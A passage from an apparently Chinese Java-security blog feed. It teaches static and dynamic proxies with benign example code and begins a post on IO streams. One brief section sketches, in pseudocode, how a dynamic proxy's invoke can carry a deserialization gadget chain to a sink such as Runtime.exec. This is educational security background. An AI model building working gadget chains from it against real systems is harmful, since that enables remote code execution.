class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.StaticProxy;  <br>  <br><span class="hljs-comment">// 中介  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Proxy</span> &#123;  <br>  <br>    <span class="hljs-keyword">private</span> Host host;  <br>  <br> <span class="hljs-keyword">public</span> <span class="hljs-title function_">Proxy</span><span class="hljs-params">()</span>&#123;&#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Proxy</span><span class="hljs-params">(Host host)</span>&#123;  <br>        <span class="hljs-built_in">this</span>.host = host;  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span>&#123;  <br>        host.rent();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Client.java</strong> 租客去找中介看房</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.StaticProxy;  <br>  <br><span class="hljs-comment">// 启动器  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        <span class="hljs-type">Host</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Host</span>();  <br> <span class="hljs-type">Proxy</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(host);  <br> proxy.rent();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><ul><li>有一些行为是中介可以做的，而房东不能做的，比如看房，收中介费等等。所以我们要在 <strong>Proxy.java</strong> 当中实现这些功能。(这里就体现出来代理模式的好处)</li></ul><p>改进 <strong>Proxy.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.StaticProxy;  <br>  <br><span class="hljs-comment">// 中介  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Proxy</span> &#123;  <br>  <br>    <span class="hljs-keyword">private</span> Host host;  <br>  <br> <span class="hljs-keyword">public</span> <span class="hljs-title function_">Proxy</span><span class="hljs-params">()</span>&#123;&#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Proxy</span><span class="hljs-params">(Host host)</span>&#123;  <br>        <span class="hljs-built_in">this</span>.host = host;  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span>&#123;  <br>        host.rent();  <br> contract();  <br> fare();  <br> &#125;  <br>  <br>    <span class="hljs-comment">// 看房  </span><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">seeHouse</span><span class="hljs-params">()</span>&#123;  <br>        System.out.println(<span class="hljs-string">&quot;中介带你看房&quot;</span>);  <br> &#125;  <br>  <br>    <span class="hljs-comment">// 收中介费  </span><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fare</span><span class="hljs-params">()</span>&#123;  <br>        System.out.println(<span class="hljs-string">&quot;收中介费&quot;</span>);  <br> &#125;  <br>  <br>    <span class="hljs-comment">// 签租赁合同  </span><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">contract</span><span class="hljs-params">()</span>&#123;  <br>        System.out.println(<span class="hljs-string">&quot;签租赁合同&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a27.png"></p><p><strong>优点：</strong></p><ul><li>可以使得我们的真实角色更加纯粹 . 不再去关注一些公共的事情 .</li><li>公共的业务由代理来完成 . 实现了业务的分工 ,</li><li>公共业务发生扩展时变得更加集中和方便 .</li></ul><p><strong>缺点 :</strong></p><ul><li>一个真是类对应一个代理角色，代码量翻倍，开发效率降低 .</li></ul><p>我们想要静态代理的好处，又不想要静态代理的缺点，所以 , 就有了动态代理 !</p><h4 id="深入理解静态代理"><a href="#深入理解静态代理" class="headerlink" title="深入理解静态代理"></a>深入理解静态代理</h4><p>深入到实际业务当中，比如我们平常做的最多的 CRUD</p><ul><li><code>UserService.java</code>，这是一个接口，我们定义四个抽象方法。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.MoreStaticProxy;  <br>  <br><span class="hljs-comment">// 深入理解静态代理  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>;  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>;  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>;  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><p>我们需要一个真实对象来完成这些增删改查操作<br><strong>UserServiceImpl.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.MoreStaticProxy;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span>&#123;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(<span class="hljs-string">&quot;增加了一个用户&quot;</span>);  <br> &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(<span class="hljs-string">&quot;删除了一个用户&quot;</span>);  <br> &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(<span class="hljs-string">&quot;更新了一个用户&quot;</span>);  <br> &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(<span class="hljs-string">&quot;查询了一个用户&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>需求来了，现在我们需要增加一个日志功能，怎么实现！</p><ul><li>思路1 ：在实现类上增加代码 【麻烦！】</li><li>思路2：使用代理来做，能够不改变原来的业务情况下，实现此功能就是最好的了！</li></ul><blockquote><p>处理手段：增加一个代理类来处理日志~</p></blockquote><p><strong>UserServiceProxy.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.MoreStaticProxy;  <br>  <br><span class="hljs-comment">// 代理  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span>&#123;  <br>    <span class="hljs-keyword">private</span> UserServiceImpl userService;  <br>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserService</span><span class="hljs-params">(UserServiceImpl userService)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.userService = userService;  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;  <br>        log(<span class="hljs-string">&quot;add&quot;</span>);  <br> userService.add();  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span> &#123;  <br>        log(<span class="hljs-string">&quot;delete&quot;</span>);  <br> userService.delete();  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;  <br>        log(<span class="hljs-string">&quot;update&quot;</span>);  <br> userService.update();  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span> &#123;  <br>        log(<span class="hljs-string">&quot;query&quot;</span>);  <br> userService.query();  <br> &#125;  <br>  <br>    <span class="hljs-comment">// 增加日志方法  </span><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log</span><span class="hljs-params">(String msg)</span>&#123;  <br>        System.out.println(<span class="hljs-string">&quot;[Debug]使用了 &quot;</span> + msg +<span class="hljs-string">&quot;方法&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>修改启动器 <strong>Client.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.MoreStaticProxy;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        <span class="hljs-type">UserServiceImpl</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();  <br>  <br> <span class="hljs-type">UserServiceProxy</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceProxy</span>();  <br> proxy.setUserService(userService);  <br> proxy.add();  <br>  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a28.png"></p><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><ul><li>前文我们说到静态代理的问题，还记得吗？</li></ul><p>每多一个房东就需要多一个中介，这显然不符合生活认知（对于租客来说，如果是用静态代理模式，每当想要换一个房东，那就必须要再换一个中介，在开发中，如果有多个中介代码量就更大了）</p><p>动态代理的出现就是为了解决上面静态代理的缺点。</p><h4 id="动态代理的代码实现"><a href="#动态代理的代码实现" class="headerlink" title="动态代理的代码实现"></a>动态代理的代码实现</h4><ul><li>要写动态代理的代码，需要抓牢两个要点</li></ul><p>①：我们代理的是接口，而不是单个用户。<br>②：代理类是动态生成的，而非静态定死。</p><p>首先是我们的接口类<br><strong>UserService.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.DynamicProxy;  <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>;  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>;  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>;  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><p>接着，我们需要用实体类去实现这个抽象类</p><p><strong>UserServiceImpl.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.DynamicProxy;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span>&#123;  <br>    <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(<span class="hljs-string">&quot;增加了一个用户&quot;</span>);  <br> &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(<span class="hljs-string">&quot;删除了一个用户&quot;</span>);  <br> &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(<span class="hljs-string">&quot;更新了一个用户&quot;</span>);  <br> &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span> &#123;  <br>        System.out.println(<span class="hljs-string">&quot;查询了一个用户&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>接着，是动态代理的实现类 (利用反射机制实现)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.DynamicProxy;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserProxyInvocationHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;  <br>  <br>    <span class="hljs-comment">// 被代理的接口  </span><br> <span class="hljs-keyword">private</span> UserService userService;  <br>  <br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserService</span><span class="hljs-params">(UserService userService)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.userService = userService;  <br> &#125;  <br>  <br>    <span class="hljs-comment">// 动态生成代理类实例  </span><br> <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(<span class="hljs-built_in">this</span>.getClass().getClassLoader(), userService.getClass().getInterfaces(), <span class="hljs-built_in">this</span>);  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>  <br>    <span class="hljs-comment">// 处理代理类实例，并返回结果  </span><br> <span class="hljs-meta">@Override</span>  <br> <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>        log(method);  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> method.invoke(userService, args);  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>  <br>    <span class="hljs-comment">//业务自定义需求  </span><br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log</span><span class="hljs-params">(Method method)</span>&#123;  <br>        System.out.println(<span class="hljs-string">&quot;[Info] &quot;</span> + method.getName() + <span class="hljs-string">&quot;方法被调用&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><ul><li>最后编写我们的 Client，也就是启动器</li></ul><p><strong>Client.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.JdkProxy.DynamicProxy;  <br>  <br><span class="hljs-keyword">import</span> src.JdkProxy.DynamicProxy.UserServiceImpl;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        <span class="hljs-comment">// 真实角色  </span><br> <span class="hljs-type">UserServiceImpl</span> <span class="hljs-variable">userServiceImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();  <br> <span class="hljs-comment">// 代理角色，不存在  </span><br> <span class="hljs-type">UserProxyInvocationHandler</span> <span class="hljs-variable">userProxyInvocationHandler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserProxyInvocationHandler</span>();  <br> userProxyInvocationHandler.setUserService((UserService) userServiceImpl); <span class="hljs-comment">// 设置要代理的对象  </span><br>  <br> <span class="hljs-comment">// 动态生成代理类  </span><br> <span class="hljs-type">UserService</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (UserService) userProxyInvocationHandler.getProxy();  <br>  <br> proxy.add();  <br> proxy.delete();  <br> proxy.update();  <br> proxy.query();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="在反序列化中动态代理的作用"><a href="#在反序列化中动态代理的作用" class="headerlink" title="在反序列化中动态代理的作用"></a>在反序列化中动态代理的作用</h2><p>回到之前文章的内容，我们之前说要利用反序列化的漏洞，我们是需要一个入口类的。</p><p>我们先假设存在一个能够漏洞利用的类为 <code>B.f</code>，比如 <code>Runtime.exec</code> 这种。<br>我们将入口类定义为 <code>A</code>，我们最理想的情况是 A[O] -&gt; O.f，那么我们将传进去的参数 <code>O</code> 替换为 <code>B</code> 即可。但是在实战的情况下这种情况是极少的。</p><p>回到实战情况，比如我们的入口类 <code>A</code> 存在 <code>O.abc</code> 这个方法，也就是 A[O] -&gt; O.abc；而 O 呢，如果是一个动态代理类，<code>O</code> 的 <code>invoke</code> 方法里存在 <code>.f</code> 的方法，便可以漏洞利用了，我们还是展示一下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">A[O] -&gt; O.abc<br>O[O2] invoke -&gt; O2.f <span class="hljs-comment">// 此时将 B 去替换 O2</span><br>最后  ----&gt;<br>O[B] invoke -&gt; B.f <span class="hljs-comment">// 达到漏洞利用效果</span><br></code></pre></td></tr></table></figure><p>动态代理在反序列化当中的利用和 <code>readObject</code> 是异曲同工的。</p><p><code>readObject</code> 方法在反序列化当中会被自动执行。<br>而 <code>invoke</code> 方法在动态代理当中会自动执行。</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a29.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://drun1baby.top/2022/06/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-04-JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/">Java反序列化基础篇-04-JDK动态代理 | Drunkbaby’s Blog</a></p><p><a href="https://zhuanlan.zhihu.com/p/72644638">设计模式（四）——搞懂什么是代理模式 - 知乎</a></p><p><a href="https://www.bilibili.com/video/BV1mc411h719?t=1062.4&p=11">https://www.bilibili.com/video/BV1mc411h719?t=1062.4&amp;p=11</a></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全-IO流</title>
    <link href="/2025/08/19/Java%E5%AE%89%E5%85%A8-IO%E6%B5%81/"/>
    <url>/2025/08/19/Java%E5%AE%89%E5%85%A8-IO%E6%B5%81/</url>
    
    <content type="html"><![CDATA[<h1 id="Java安全-IO流"><a href="#Java安全-IO流" class="headerlink" title="Java安全-IO流"></a>Java安全-IO流</h1><h2 id="初识IO流"><a href="#初识IO流" class="headerlink" title="初识IO流"></a>初识IO流</h2><p>IO是指 Input&#x2F;Output，即输入和输出。以内存为中心：</p><p>为什么要把数据读到内存才能处理这些数据？因为代码是在内存中运行的，数据也必须读到内存，最终的表示方式无非是 byte数 组，字符串等，都必须存放在内存里。</p><p>从 Java 代码来看，输入实际上就是从外部，例如，硬盘上的某个文件，把内容读到内存，并且以 Java 提供的某种数据类型表示，例如，<code>byte[]</code>，<code>String</code>，这样，后续代码才能处理这些数据。</p><p>因为内存有“易失性”的特点，所以必须把处理后的数据以某种方式输出，例如，写入到文件。Output 实际上就是把 Java 表示的数据格式，例如，<code>byte[]</code>，<code>String</code>等输出到某个地方。</p><p>IO 流是一种顺序读写数据的模式，它的特点是单向流动。数据类似自来水一样在水管中流动，所以我们把它称为 IO 流。</p><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><h3 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h3><h4 id="方式一：根据路径创建一个-File-对象"><a href="#方式一：根据路径创建一个-File-对象" class="headerlink" title="方式一：根据路径创建一个 File 对象"></a>方式一：根据路径创建一个 File 对象</h4><ul><li>方法 <code>new File(String pathname)</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-comment">// 根据路径创建一个 File 对象</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">newFile</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        createFile();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createFile</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile/new1.txt&quot;</span>);<br>        <span class="hljs-keyword">try</span>&#123;<br>            file.createNewFile();<br>            System.out.println(<span class="hljs-string">&quot;Create Successfully&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="方式二：根据父目录-File-对象，在子路径创建一个文件"><a href="#方式二：根据父目录-File-对象，在子路径创建一个文件" class="headerlink" title="方式二：根据父目录 File 对象，在子路径创建一个文件"></a>方式二：根据父目录 File 对象，在子路径创建一个文件</h4><ul><li>方法 <code>new File(File parent, String child)</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;  <br>  <br><span class="hljs-keyword">import</span> java.io.File;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br>  <br><span class="hljs-comment">// 根据父目录File对象，在子路径创建一个文件  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">newFile02</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> 